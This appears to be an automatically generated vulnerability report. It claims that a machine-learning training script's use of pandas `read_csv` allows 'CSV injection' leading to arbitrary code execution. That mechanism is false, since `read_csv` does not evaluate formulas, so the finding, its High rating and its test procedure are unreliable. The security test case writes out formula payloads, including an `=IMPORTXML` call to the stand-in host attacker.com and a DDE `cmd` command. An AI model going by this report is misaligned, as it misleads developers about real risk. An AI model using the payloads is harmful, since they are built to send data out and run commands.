- Vulnerability Name: CSV Injection in Training Data Loading
- Description:
    1. An attacker crafts a malicious CSV file containing code designed for CSV injection vulnerabilities in pandas `read_csv` function.
    2. The user, intending to train a model using this project's example, configures their ML pipeline to use the attacker's malicious CSV file as the training dataset. This could happen if the user's data source is compromised or if the attacker can influence the data before it's used in the pipeline.
    3. When the training script `/code/src/model/train.py` executes, it uses pandas `pd.read_csv()` to load the training data from the attacker-controlled CSV file.
    4. Due to the CSV injection vulnerability, malicious code embedded in the CSV is executed during the data loading process.
- Impact:
    Arbitrary code execution on the machine running the training pipeline. This could lead to data exfiltration, system compromise, or other malicious activities.
- Vulnerability Rank: High
- Currently Implemented Mitigations: None
- Missing Mitigations:
    - Input validation and sanitization of CSV files before loading. This could involve checking for and escaping or rejecting potentially harmful characters or patterns in the CSV data.
    - Using secure data loading methods that are not vulnerable to CSV injection. Explore alternatives to `pd.read_csv()` if a safer option exists for the project's data format.
    - Implementing sandboxing or containerization for data processing and model training tasks to limit the impact of potential code execution vulnerabilities. Running these processes in isolated environments with restricted permissions can contain the damage.
- Preconditions:
    - The user must configure their MLOps pipeline to use a training dataset that is controlled or influenced by the attacker.
    - The training pipeline must execute the vulnerable code `/code/src/model/train.py` which uses `pd.read_csv()` to load the data.
- Source Code Analysis:
    1. Open the file `/code/src/model/train.py`.
    2. Locate the `main` function.
    3. Inside the `main` function, find the line: `df = pd.read_csv(args.input_data)`.
    4. Observe that `args.input_data`, which is user-provided input specifying the path to the training data, is directly passed to the `pd.read_csv()` function without any prior validation or sanitization.
    5. If `args.input_data` points to a malicious CSV file, the `pd.read_csv()` function is vulnerable to CSV injection, potentially leading to arbitrary code execution.
    6. Confirm that there is no input validation or sanitization performed on `args.input_data` or the content of the CSV file before it's loaded using `pd.read_csv()`.
- Security Test Case:
    1. Create a malicious CSV file named `malicious.csv` with a CSV injection payload. For example, using a formula injection payload:
       ```csv
       Column1,Column2
       =IMPORTXML(‘http://attacker.com/malicious.xml’,‘/’),value2
       ```
       **Note:** The specific payload might need to be adjusted based on the exact version of pandas and the underlying libraries to ensure successful injection. `=IMPORTXML` is used as an example, and other payloads like `=SYSTEM`, `=cmd|' /C calc'!A0` or similar might be applicable depending on the environment and pandas version.
    2. Modify the `cli/jobs/train.yml` file to use the `malicious.csv` file as input.  Change the `path` under `inputs.nyc_taxi_data` to point to the `malicious.csv` file. If testing locally, this could be a relative or absolute file path accessible to the execution environment. For testing in an Azure ML environment, the `malicious.csv` file would need to be uploaded to a datastore and the `path` should be adjusted to reference the datastore path.
    3. Run the training job using the modified `cli/jobs/train.yml`. Execute the script using: `bash ./scripts/jobs/train.sh`.
    4. Monitor the execution logs and system behavior for signs of code injection. For example, if the payload is designed to perform a network request (like `=IMPORTXML(‘http://attacker.com/malicious.xml’,‘/’)`), monitor for network connections to `attacker.com`. If the payload is intended to execute a system command (if possible with `pd.read_csv` and the environment), check for the effects of that command, such as file creation or process execution.
    5. If the malicious actions defined in the CSV payload are observed, the CSV injection vulnerability is confirmed. For example, if using `=IMPORTXML`, and a network request to `attacker.com` is observed when running the training job, this confirms the injection. For more direct command execution payloads (if applicable to `pd.read_csv`), successful execution of the injected commands would confirm the vulnerability.